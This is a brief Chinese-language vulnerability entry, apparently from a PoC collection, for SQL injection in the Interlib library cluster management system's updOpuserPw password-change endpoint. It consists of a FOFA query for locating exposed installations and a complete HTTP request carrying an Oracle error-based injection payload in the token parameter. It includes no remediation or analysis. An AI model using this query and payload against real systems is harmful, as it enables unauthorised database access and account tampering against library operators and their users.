## 广州图创图书馆集群管理系统updOpuserPw接口存在SQL注入漏洞



## fofa
```
body="interlib/common/" || body="Interlib图书馆集群管理系统" || body="/interlib3/system_index" || body="打开Interlib主界面"
```


## poc
```
GET /interlib3/service/sysop/updOpuserPw?loginid=admin11&newpassword=Aa@123456&token=1%27and+ctxsys.drithsx.sn(1,(select%20111111*1111111%20from%20dual))=%272 HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
Accept-Charset: utf-8
Accept-Encoding: gzip, deflate
Connection: close

```
